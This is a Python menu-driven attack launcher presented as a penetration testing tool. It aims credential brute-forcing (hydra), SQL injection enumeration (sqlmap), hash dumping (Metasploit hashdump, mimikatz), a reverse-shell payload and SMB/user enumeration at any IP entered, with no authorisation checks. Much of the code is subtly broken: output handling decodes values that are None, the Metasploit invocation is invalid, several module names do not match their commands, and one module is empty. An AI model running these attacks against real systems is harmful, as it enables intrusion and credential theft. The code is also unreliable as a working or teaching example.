import os
import subprocess
import time
import logging

# Setup logging to both console and file
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Log to a file
file_handler = logging.FileHandler('pentesting_tool.log')
file_handler.setLevel(logging.INFO)
file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(file_formatter)

# Log to console
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(message)s')
console_handler.setFormatter(console_formatter)

# Add handlers to the logger
logger.addHandler(file_handler)
logger.addHandler(console_handler)

def run_subprocess(command, output_file):
    """Helper function to run subprocess, capture output and save to a file."""
    with open(output_file, 'w') as log_file:
        try:
            logger.info(f"Running command: {' '.join(command)}")
            result = subprocess.run(command, stdout=log_file, stderr=subprocess.STDOUT, check=True)
            log_file.write(result.stdout.decode())
            logger.info(f"[+] Command executed successfully: {' '.join(command)}")
        except subprocess.CalledProcessError as e:
            log_file.write(e.output.decode())
            logger.error(f"[!] Error executing command: {' '.join(command)} - {e}")

# Module 1: mssqlinfo - Gather info from MSSQL Server
def mssqlinfo_module(target_ip):
    output_file = "mssqlinfo_output.log"
    logger.info(f"\n[+] Starting MSSQL Info Gathering on {target_ip}...")
    run_subprocess(["sqlmap", "-u", f"http://{target_ip}/vulnerable_url", "--dbs"], output_file)
    logger.info(f"[+] Finished MSSQL Info Gathering on {target_ip}.\n")

# Module 2: TDS Protocol - Test TDS Protocol (related to SQL Server)
def tds_protocol_module(target_ip):
    output_file = "tds_protocol_output.log"
    logger.info(f"\n[+] Starting TDS Protocol Check on {target_ip}...")
    run_subprocess(["python3", "tds.py", target_ip], output_file)  # Placeholder for TDS check
    logger.info(f"[+] Finished TDS Protocol Check on {target_ip}.\n")

# Module 3: Password Guesser - Brute force passwords
def passwordguesser_module(target_ip):
    output_file = "passwordguesser_output.log"
    logger.info(f"\n[+] Starting Password Guessing on {target_ip}...")
    run_subprocess(["hydra", "-l", "admin", "-P", "/path/to/wordlist.txt", target_ip, "http-get"], output_file)
    logger.info(f"[+] Finished Password Guessing on {target_ip}.\n")

# Module 4: Password Stealer - Extract passwords (simulation)
def passwordstealer_module(target_ip):
    output_file = "passwordstealer_output.log"
    logger.info(f"\n[+] Starting Password Stealer on {target_ip}...")
    run_subprocess(["metasploit-framework", "-x", "use post/windows/gather/hashdump"], output_file)
    logger.info(f"[+] Finished Password Stealer on {target_ip}.\n")

# Module 5: Dump Hashed Passwords - Extract hashed passwords from systems
def dump_hashed_passwords(target_ip):
    output_file = "hashed_passwords_output.log"
    logger.info(f"\n[+] Starting Hash Dump on {target_ip}...")
    run_subprocess(["mimikatz", "lsadump::sam"], output_file)  # Placeholder mimikatz usage
    logger.info(f"[+] Finished Hash Dump on {target_ip}.\n")

# Module 6: xpcmdshell - Run commands on a target (Windows)
def xpcmdshell_module(target_ip):
    output_file = "xpcmdshell_output.log"
    logger.info(f"\n[+] Starting XP Command Shell on {target_ip}...")
    run_subprocess(["metasploit-framework", "-x", "use exploit/windows/shell_reverse_tcp"], output_file)
    logger.info(f"[+] Finished XP Command Shell on {target_ip}.\n")

# Module 7: SMB Auth Capture - Capture SMB authentication data
def smbauthcapture_module(target_ip):
    output_file = "smbauthcapture_output.log"
    logger.info(f"\n[+] Starting SMB Authentication Capture on {target_ip}...")
    run_subprocess(["smbclient", "-L", target_ip, "-U", "guest"], output_file)
    logger.info(f"[+] Finished SMB Authentication Capture on {target_ip}.\n")

# Module 8: OLE Automation - Exploit OLE Automation vulnerabilities
def oleautomation_module(target_ip):
    output_file = "oleautomation_output.log"
    logger.info(f"\n[+] Starting OLE Automation Exploit on {target_ip}...")
    # Placeholder for exploiting OLE Automation vulnerability
    logger.info(f"[+] Finished OLE Automation Exploit on {target_ip}.\n")

# Module 9: Bulk Open - Open multiple connections or sessions
def bulkopen_module(target_ip):
    output_file = "bulkopen_output.log"
    logger.info(f"\n[+] Starting Bulk Open on {target_ip}...")
    run_subprocess(["nmap", "-p", "80,443", target_ip], output_file)
    logger.info(f"[+] Finished Bulk Open on {target_ip}.\n")

# Module 10: XP Directory - Directory enumeration (Active Directory)
def xpdirectory_module(target_ip):
    output_file = "xpdirectory_output.log"
    logger.info(f"\n[+] Starting XP Directory Enumeration on {target_ip}...")
    run_subprocess(["nmap", "--script", "smb-enum-users", target_ip], output_file)
    logger.info(f"[+] Finished XP Directory Enumeration on {target_ip}.\n")

# Module 11: Search - Search for patterns in column names (SQL)
def search_module(target_ip):
    output_file = "search_output.log"
    logger.info(f"\n[+] Starting Search for patterns on {target_ip}...")
    run_subprocess(["sqlmap", "-u", f"http://{target_ip}/vulnerable_url", "--search", "%password%"], output_file)
    logger.info(f"[+] Finished Search for patterns on {target_ip}.\n")

# Function to display the main menu and handle user input
def show_menu():
    print("\nSelect a module to run:")
    print("1. mssqlinfo module")
    print("2. TDS Protocol Module")
    print("3. Password Guesser Module")
    print("4. Password Stealer Module")
    print("5. Dump Hashed Passwords")
    print("6. XP Command Shell Module")
    print("7. SMB Auth Capture Module")
    print("8. OLE Automation Module")
    print("9. Bulk Open Module")
    print("10. XP Directory Module")
    print("11. Search Module")
    print("12. Exit")

def get_user_choice():
    while True:
        try:
            choice = int(input("Enter your choice: "))
            if 1 <= choice <= 12:
                return choice
            else:
                print("[!] Invalid choice. Please try again.")
        except ValueError:
            print("[!] Please enter a valid number.")

def main():
    print("Welcome to the Penetration Testing Tool\n")
    target_ip = input("Enter the target IP address: ")

    while True:
        show_menu()
        choice = get_user_choice()

        if choice == 1:
            mssqlinfo_module(target_ip)
        elif choice == 2:
            tds_protocol_module(target_ip)
        elif choice == 3:
            passwordguesser_module(target_ip)
        elif choice == 4:
            passwordstealer_module(target_ip)
        elif choice == 5:
            dump_hashed_passwords(target_ip)
        elif choice == 6:
            xpcmdshell_module(target_ip)
        elif choice == 7:
            smbauthcapture_module(target_ip)
        elif choice == 8:
            oleautomation_module(target_ip)
        elif choice == 9:
            bulkopen_module(target_ip)
        elif choice == 10:
            xpdirectory_module(target_ip)
        elif choice == 11:
            search_module(target_ip)
        elif choice == 12:
            logger.info("[+] Exiting Tool...")
            print("[+] Exiting Tool...")
            break
        
        time.sleep(1)

if __name__ == "__main__":
    main()
